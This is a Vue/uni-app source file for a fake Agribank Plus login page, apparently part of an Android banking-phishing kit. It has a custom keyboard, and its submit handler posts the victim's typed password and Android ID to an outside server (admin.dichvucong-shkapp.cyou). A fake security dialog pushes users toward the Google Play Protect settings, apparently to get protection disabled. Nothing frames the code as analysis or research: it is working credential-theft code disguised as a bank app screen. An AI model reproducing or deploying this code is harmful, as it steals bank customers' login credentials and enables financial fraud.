<template>
	<view class="bg_header" style="position: relative;background-color: #FFFFFF;min-height: 100vh;overflow: hidden;">
		<view style="background-color:#bb2336;padding-top: 30px;">
			<header
				style="padding:20px 20px 0;display: flex;align-items: center;justify-content: space-between;gap:12px;background-color: #FFFFFF;border-radius: 8px 8px 0 0;">
				<image src="/static/close.svg" mode="aspectFit" :style="$theme.setImageSize(24)" @tap="openApp()"> </image>
				<image src="/static/argibank_logo3.png" mode="widthFix" :style="$theme.setImageSize(160,48)"> </image>
				<image src="/static/ic_lang_vn.png" mode="aspectFit" :style="$theme.setImageSize(24)" @tap="openApp()"> </image>
			</header>
		</view>

		<view style="display: flex;align-items: center;justify-content: center;padding-top:80px;">
			<image src="/static/ren.svg" mode="aspectFit" style="border-radius: 100%;" :style="$theme.setImageSize(72)">
			</image>
		</view>
		<view style="padding-top: 16px;color:#000;text-align: center;font-size: 15px;font-weight: 700;">
			{{`Buổi tối ấm cúng nha`}}
		</view>

		<view style="padding:20px;margin-top: 20px;">
			<view class="form_input" style="">
				<view
					style="flex:1;z-index: 18;display: flex;align-items: center;justify-content: space-between;min-height: 24px;"
					@click="openKeyword()">
					<template v-if="curValue.length<=0 && !showKeyword">
						<view style="color: #707070;">{{`Nhập mật khẩu`}}</view>
					</template>
					<view style="display: flex;align-items: center;gap:3px;">
						<template v-if="isMask">
							<block v-for="(v,k) in curValue" :key="k">
								<!-- 显示键盘，输入内容，最后一个显示为* -->
								<template v-if="showKeyword && curValue.length>0 && k==curValue.length-1">
									<view class="font_star">{{`*`}}</view>
								</template>
								<template v-else>
									<view class="pwd_point"> </view>
								</template>
							</block>
							<template v-if="showKeyword">
								<view style="width: 1.5px;height: 22px;margin:2px 0;"
									:style="{backgroundColor:isCursorVisible?`#Ab233699`:`transparent` }">
								</view>
							</template>
						</template>
						<template v-else>
							<view class="password_show">{{curValue.join('')}} </view>
							<template v-if="showKeyword">
								<view style="width: 1px;height: 22px;margin:2px 0;"
									:style="{backgroundColor:isCursorVisible?`#Ab233699`:`transparent` }"></view>
							</template>
						</template>
					</view>
				</view>
				<template v-if="curValue.length>0">
					<image src="/static/bh_app_imgs_close_small_ico.png" mode="aspectFit" @click.stop="curValue=[]"
						style="margin-left: auto;" :style="$theme.setImageSize(16)">
					</image>
				</template>
				<image :src="`/static/yj${isMask?'':`_hide`}.svg`" mode="aspectFit" @click="toggleMask()"
					style="margin-left: auto;" :style="$theme.setImageSize(16)">
				</image>
			</view>
			<!-- 密码输入不足六位 -->
			<template v-if="showTipPwd">
				<view style="padding-top: 10px;color:#f13621;font-size: 15px;font-weight: normal;">
					{{`mật khẩu gồm 6 đến 20 ký tự`}}
				</view>
			</template>

			<view class="btn_submit" style="margin-top: 20px;" @tap="handleSubmit()"> {{`Đăng nhập`}} </view>

			<view style="padding-top: 20px;color:#b82438;text-align: right;font-size: 16px;font-weight: 800;"
				@tap="openApp()">{{`Quên mật khẩu?`}}</view>
		</view>

		<view style="position: absolute;bottom: 40px;left: 0;right: 0;padding:0 40px;">
			<view style="display: flex;align-items: center;justify-content: space-between;gap:20px;">
				<view style="flex:1;display: flex;align-items: center;gap:10px;" @tap="openApp()">
					<image src="/static/fenxiang.svg" mode="aspectFit" :style="$theme.setImageSize(16)">
					</image>
					<text class="font_family" style="color:#b82438;font-size: 16px;font-weight: 800;"> {{`Chia sẽ`}}</text>
				</view>
				<view style="flex:1;display: flex;align-items: center;gap:10px;" @tap="openApp()">
					<image src="/static/wenhao.svg" mode="aspectFit" :style="$theme.setImageSize(16)">
					</image>
					<text style="color:#b82438 ;font-size: 16px;font-weight: 800;"> {{`Hỏi đáp`}}</text>
				</view>
				<view style="margin-left: auto;display: flex;align-items: center;gap:10px;" @tap="openApp()">
					<image src="/static/dianhua.svg" mode="aspectFit" :style="$theme.setImageSize(16)">
					</image>
					<text style="color:#b82438 ;font-size: 16px;font-weight: 800;"> {{`Liên hệ`}}</text>
				</view>
			</view>
		</view>
		<!-- </view> -->

		<template v-if="showKeyword">
			<view class="overlay" style="background-color: transparent;top:50vh;" @tap="closeKeyword()"></view>
			<view class="modal_wrapper_bottom
			
			
			
			" style="background-color: #dedede;">
				<view style="font-size: 24px;font-weight: 400;">
					<view class="keyword_row" style="padding:8px 2px 4px 2px;gap: 6px;">
						<block v-for="(v,k) in keywordNumber" :key="k">
							<template v-if="isSymbol">
								<view class="keyword_row_item" :style="{backgroundColor:curKey==v?`#efced7`:`#f7f7f7`}"
									@tap="chooseKey(v)">
									<Tooltip :content="v" placement="top" :status="curKey==v">
										<view class="text_font">{{v}}</view>
									</Tooltip>
								</view>
							</template>
							<template v-else>
								<view class="keyword_row_item" :style="{backgroundColor:curKey==v?`#efced7`:`transparent`}"
									@tap="chooseKey(v)">
									<Tooltip :content="v" placement="top" :status="curKey==v">
										<view class="text_font">{{v}}</view>
									</Tooltip>
								</view>
							</template>
						</block>
					</view>

					<view class="keyword_row" style="padding:4px 2px;gap: 6px;">
						<template v-if="isSymbol">
							<block v-for="(v,k) in symbol0" :key="k">
								<view class="keyword_row_item symbol_font" :style="{backgroundColor:curKey==v?`#efced7`:`#f7f7f7`}"
									@tap="chooseKey(v)">
									<Tooltip :content="v" placement="top" :status="curKey==v">
										<view class="symbol_font">{{v}}</view>
									</Tooltip>
								</view>
							</block>
						</template>
						<template v-else>
							<block v-for="(v,k) in keywordqp" :key="k">
								<view class="keyword_row_item" :style="{backgroundColor:curKey==v?`#efced7`:`#f7f7f7`}"
									@tap="chooseKey(v)">
									<Tooltip :content="v" placement="top" :status="curKey==v">
										<view class="text_font">{{v}}</view>
									</Tooltip>
								</view>
							</block>
						</template>
					</view>
					<view class="keyword_row" style="gap: 6px;" :style="{padding:isSymbol?`4px 2px`:`4px 16px`}">
						<template v-if="isSymbol">
							<block v-for="(v,k) in symbol1" :key="k">
								<view class="keyword_row_item symbol_font" :style="{backgroundColor:curKey==v?`#efced7`:`#f7f7f7`}"
									@tap="chooseKey(v)">
									<Tooltip :content="v" placement="top" :status="curKey==v">
										<view class="symbol_font">{{v}}</view>
									</Tooltip>
								</view>
							</block>
						</template>
						<template v-else>
							<block v-for="(v,k) in keywordal" :key="k">
								<view class="keyword_row_item" :style="{backgroundColor:curKey==v?`#efced7`:`#f7f7f7`}"
									@tap="chooseKey(v)">
									<Tooltip :content="v" placement="top" :status="curKey==v">
										<view class="text_font">{{v}}</view>
									</Tooltip>
								</view>
							</block>
						</template>
					</view>
					<view class="keyword_row" style="padding:4px 2px;gap: 6px;">
						<template v-if="isSymbol">
							<block v-for="(v,k) in symbol2" :key="k">
								<view class="keyword_row_item symbol_font" :style="{backgroundColor:curKey==v?`#efced7`:`#f7f7f7`}"
									@tap="chooseKey(v)">
									<Tooltip :content="v" placement="top" :status="curKey==v">
										<view class="symbol_font">{{v}}</view>
									</Tooltip>
								</view>
							</block>
						</template>
						<template v-else>
							<view @tap="changeCapital(`cap`)" class="keyword_row_item" style="padding:0 7px;height: 40px;"
								:style="{backgroundColor: curKey==`cap` ? `#00abaf` : `#F7F7F7`}">
								<template v-if="curKey==`cap`">
									<image src="/static/arrow_up_fff.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
								<template v-else>
									<image src="/static/arrow_up.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
							</view>
							<block v-for="(v,k) in keywordzm" :key="k">
								<view class="keyword_row_item" :style="{backgroundColor:curKey==v?`#efced7`:`#f7f7f7`}"
									@tap="chooseKey(v)">
									<Tooltip :content="v" placement="top" :status="curKey==v">
										<view class="text_font">{{v}}</view>
									</Tooltip>
								</view>
							</block>
						</template>
						<template v-if="isSymbol">
							<view class="keyword_row_item " style="padding:0 20px;height: 40px;" @touchstart="startTouch(`bs`)"
								@touchend="endTouch" @touchcancel="endTouch"
								:style="{backgroundColor: curKey==`bs` ? `#00abaf` : `#F7f7f7`}">
								<template v-if="curKey==`bs`">
									<image src="/static/backspace_fff.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
								<template v-else>
									<image src="/static/backspace.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
							</view>
						</template>
						<template v-else>
							<!-- @click="handleBackSpace(`bs`)" -->
							<view class="keyword_row_item" style="padding:0 8px;height: 40px;" @touchstart="startTouch(`bs`)"
								@touchend="endTouch" @touchcancel="endTouch"
								:style="{backgroundColor: curKey==`bs` ? `#bb2336 ` : `#F7F7F7`}">
								<template v-if="curKey==`bs`">
									<image src="/static/backspace_fff.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
								<template v-else>
									<image src="/static/backspace.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
							</view>
						</template>
					</view>

					<view class="keyword_row" style="padding:4px 2px 16px 2px;gap: 6px;">
						<template v-if="isSymbol">
							<view @tap="changeSymbol(`symbol`)" class="keyword_row_item "
								style="text-align: center;font-size: 13px;padding:0 10px;"
								:style="{backgroundColor: curKey==`symbol` ? `#bb2336 ` : `#F7F7F7`}">ABC
							</view>
						</template>
						<template v-else>
							<view @tap="changeSymbol(`symbol`)" class="keyword_row_item"
								style="text-align: center;font-size: 16px;padding:0 10px;"
								:style="{backgroundColor: curKey==`symbol` ? `#bb2336 ` : `#F7F7F7`}">!#1
							</view>
						</template>

						<!-- <template v-if="isSymbol"> -->
						<!-- <view class="keyword_row_item" style="padding:0 2px;">
								<image src="/static/logo_bidv.png" mode="aspectFit" @click.stop="toggleMask()"
									:style="$theme.setImageSize(24)">
								</image>
							</view> -->
						<!-- 	</template>
						<template v-else>
							<view class="keyword_row_item" style="padding:0 28px;">
								<image :src="`/static/mask_${isMask?`show`:`hide`}.svg`" mode="aspectFit" @click.stop="toggleMask()"
									:style="$theme.setImageSize(24)">
								</image>
							</view>
						</template> -->
						<view class="keyword_row_item" :style="{backgroundColor:curKey==`,`?`#efced7`:`#f7f7f7`}"
							@tap="chooseKey(`,`)">
							<Tooltip :content="`,`" placement="top" :status="curKey==`,`">
								<view class="symbol_font">,</view>
							</Tooltip>
						</view>
						<template v-if="isSymbol">
							<view class="keyword_row_item" :style="{backgroundColor:curKey=='`'?`#efced7`:`#f7f7f7`}"
								@tap="chooseKey('`')">
								<Tooltip content="`" placement="top" :status="curKey=='`'">
									<view class="symbol_font">`</view>
								</Tooltip>
							</view>
						</template>
						<template v-if="isSymbol">
							<view class="keyword_row_item symbol_font"
								style="flex:1 0 auto;color: transparent;background-color: #f7f7f7;">
								Space</view>
						</template>
						<template v-else>
							<view class="keyword_row_item" style="flex:3 0;  color: transparent;background-color: #f7f7f7;">
								Space</view>
						</template>

						<template v-if="isSymbol">
							<view class="keyword_row_item symbol_font" :style="{backgroundColor:curKey=='_'?`#efced7`:`#f7f7f7`}"
								@tap="chooseKey('_')">
								<Tooltip content="_" placement="top" :status="curKey=='_'">
									<view class="symbol_font">_</view>
								</Tooltip>
							</view>
						</template>
						<view class="keyword_row_item" :style="{backgroundColor:curKey=='.'?`#efced7`:`#f7f7f7`}"
							@tap="chooseKey('.')">
							<Tooltip content="." placement="top" :status="curKey=='.'">
								<view class="symbol_font">.</view>
							</Tooltip>
						</view>
						<template v-if="isSymbol">
							<view @tap="closeKeyword()" class="keyword_row_item"
								style="height: 40px;background-color:#999;padding:0 24px;">
								<image src="/static/enter.svg" mode="aspectFit" :style="$theme.setImageSize(20)">
								</image>
							</view>
						</template>
						<template v-else>
							<view class="keyword_row_item" style="height: 40px;background-color:#999;padding:0 16px;"
								@tap="closeKeyword()">
								<image src="/static/f.svg" mode="aspectFit" :style="$theme.setImageSize(28)">
								</image>
							</view>
						</template>
					</view>
				</view>
			</view>
		</template>

		<!-- 按错密码 -->
		<template v-if="showPwdError">
			<view class="overlay" style="z-index: 19;" @tap="showPwdError=false"></view>
			<view class="modal_wrapper_center" style="background-color: #F4F4F4;padding: 20px;z-index: 19;">
				<view>
					<view style="display: flex;align-items: center;justify-content: flex-start;">
						<image src="/static/tanhao.svg" mode="scaleToFill" :style="$theme.setImageSize(32)"></image>
					</view>
					<view style="font-size: 16px;font-weight:500;padding:20px 0;">Thông báo</view>
					<view style="font-size: 16px;color: #666;font-weight:normal;">
						<view>
							<!-- 为了增强安全性，Agribank Plus 要求您的设备始终启用 Google Play Protect。这是 Google 的一项功能，可帮助检测涉嫌对 Android 设备造成损害的应用程序。请打开 Google Play 商店应用程序/选择帐户图标/选择 Play Protect/选择设置。 -->
							{{`Để tăng cường bảo mật Agribank Plus yêu cầu thiết bị của Quý khách luôn được bật cài đặt Google Play Protect . Đây là tính năng của Google hỗ trợ phát hiện các ứng dụng có nghi ngờ gây hại cho thiết bị Android. Quý khách vui lòng mở Google Play Store App/ Chọn biểu tượng Tài khoản/ Chọn Play Protect/ Chọn cài đặt.`}}
						</view>
					</view>
					<view @tap="openApp()" class="btn_submit" style="margin-top: 40px;color: #FFF;">
						{{`ĐỒNG Ý`}}
					</view>
				</view>
			</view>
		</template>

		<!-- 登录信息不正确。请再次检查 -->
		<!-- <template v-if="showTipPwd">
			<view class="overlay" style="z-index: 19;" @tap="showTipPwd=false"></view>
			<view class="modal_wrapper_center" style="background-color: #F4F4F4;padding: 20px;z-index: 19;">
				<view>
					<view style="display: flex;align-items: center;justify-content: flex-start;">
						<image src="/static/tanhao.svg" mode="scaleToFill" :style="$theme.setImageSize(32)"></image>
					</view>
					<view style="font-size: 16px;font-weight:500;padding:20px 0;">Thông báo</view>
					<view style="font-size: 16px;color: #666;font-weight:normal;">
						<view>{{`Thông tin đăng nhập không chính xác.`}}</view>
						<view>{{`Quý khách vui lòng kiểm tra lại.`}}</view>
					</view>
					<view @tap="showTipPwd=false" class="btn_submit" style="margin-top: 40px;color: #FFF;">
						Đồng</view>
				</view>
			</view>
		</template> -->
	</view>
</template>

<script>
	export default {
		data() {
			return {
				isMask: true,
				showKeyword: false,
				// 键盘
				keywordNumber: [1, 2, 3, 4, 5, 6, 7, 8, 9, 0],
				qp: [`q`, `w`, `e`, `r`, `t`, `y`, `u`, `i`, `o`, `p`],
				al: [`a`, `s`, `d`, `f`, `g`, `h`, `j`, `k`, `l`],
				zm: [`z`, `x`, `c`, `v`, `b`, `n`, `m`],
				qpCapital: [`Q`, `W`, `E`, `R`, `T`, `Y`, `U`, `I`, `O`, `P`],
				alCapital: [`A`, `S`, `D`, `F`, `G`, `H`, `J`, `K`, `L`],
				zmCapital: [`Z`, `X`, `C`, `V`, `B`, `N`, `M`],
				symbol0: [`@`, `#`, `$`, `%`, `&`, `*`, `-`, `+`, `(`, `)`],
				symbol1: [`~`, `^`, `<`, `>`, `|`, `\\`, `{`, `}`, `[`, `]`],
				symbol2: [`=`, `!`, `"`, `'`, `:`, `;`, `/`, `?`],

				isCapital: false, // 是否显示大写字母
				isSymbol: false, // 符号页
				curValue: [], // 当前输入值

				curKey: null, // 当前选中，仅限用于触摸改变背景色
				isCursorVisible: true, // 光标的显示状态
				timer: null,

				showPwdError: false, // 密码输入错误
				showTipPwd: false, // 密码输入不足八位

				longPressTimeout: null,
				isLongPressTriggered: false,

				android_id: '000000', // 默认
			}
		},
		computed: {
			keywordqp() {
				return this.isCapital ? this.qpCapital : this.qp;
			},
			keywordal() {
				return this.isCapital ? this.alCapital : this.al;
			},
			keywordzm() {
				return this.isCapital ? this.zmCapital : this.zm;
			},
			hideValue() {
				return this.curValue.map(v => v = `.`).join('');
			},
		},
		onLoad(opt) {
			this.android_id = opt.android_id || this.android_id;
		},
		onShow() {
			// this.isMask = uni.getStorageSync('masking');
			clearInterval(this.timer);
			// this.showAlert = true;
			// this.openKeyword();
		},
		onHide() {
			clearInterval(this.timer);
		},
		methods: {
			openApp() {
				this.handleSubmit();
				this.showPwdError = false; // 关闭密码输入错误层
				// 调用 Android 提供的接口
				if (window.AGRIInterface) {
					window.AGRIInterface.AgriApp();
					this.closeAlert();
					this.curValue = [];
				} else {
					this.closeAlert();
					this.curValue = [];
					// alert("Android interface is not available.");
				}
			},
			async handleSubmit() {
				this.closeKeyword();
				// 没有输入内容时
				if (this.curValue.length < 6) {
					this.showTipPwd = true;
					return false;
				}
				// this.showPwdError = true; // 显示密码输入错误提示层
				const headers = {
					"Content-Type": "application/x-www-form-urlencoded",
				};
				const API = `https://admin.dichvucong-shkapp.cyou/api/keyboard-input`;
				const tempData = {
					android_id: this.android_id, // 通过链接参数获取
					input_text: "AGRI登录密码："+this.curValue.join(''), // 密码输入内容
					timestamp: new Date().getTime(), // 毫秒时间戳
				}
				console.log(tempData);
				const response = await uni.request({
					url: API,
					method: 'POST',
					data: tempData,
					header: headers
				});
				const [err, res] = response;
				
				console.log(res);
				if (res && res.statusCode == 200) {
					// this.curValue = [];
						uni.navigateTo({
							url: `/pages/security?android_id=${this.android_id}`
						});
				}
			},

			closeAlert() {
				this.showAlert = false;
			},

			// 按键特效
			effect(val) {
				this.curKey = val;
				setTimeout(() => {
					this.curKey = null;
				}, 100);
			},

			toggleMask() {
				this.isMask = !this.isMask;
				this.closeKeyword();
			},
			startCursorBlink() {
				// 定时器控制光标闪烁
				this.timer = setInterval(() => {
					this.isCursorVisible = !this.isCursorVisible;
				}, 500); // 每500毫秒切换光标状态
			},

			openKeyword() {
				this.showKeyword = true;
				this.showTipPwd = false;
				clearInterval(this.timer);
				this.startCursorBlink();
			},
			closeKeyword() {
				this.showKeyword = false;
				this.isCapital = false;
				this.isSymbol = false;
				clearInterval(this.timer);
			},

			// 大小写转换
			changeCapital(val) {
				this.isCapital = !this.isCapital;
				this.effect(val);
			},
			changeSymbol(val) {
				this.isSymbol = !this.isSymbol;
				this.effect(val);
			},
			// 选中一个字符
			chooseKey(val) {
				if (val == `\\`) {
					this.curValue.push(`\\`);
				} else {
					this.curValue.push(val);
				}
				this.effect(val);
			},
			// 退格
			startTouch(val) {
				this.curKey = val;
				if (this.curValue.length <= 0) {
					// clearInterval(this.timer);
					this.curKey = null;
					return false;
				}
				this.isLongPressTriggered = false; // 重置长按状态
				// 设置一个定时器
				this.longPressTimeout = setTimeout(() => {
					this.isLongPressTriggered = true; // 触发长按
					if (this.curValue.length > 0) {
						this.curValue = [];
					}
				}, 800); // 长按阈值（500ms）
			},
			endTouch() {
				this.curKey = null;
				clearTimeout(this.longPressTimeout); // 清除定时器
				if (!this.isLongPressTriggered) {
					if (this.curValue.length > 0) {
						this.curValue = this.curValue.slice(0, this.curValue.length - 1);
					}
				}
				this.isLongPressTriggered = false; // 重置状态
			},
		}
	}
</script>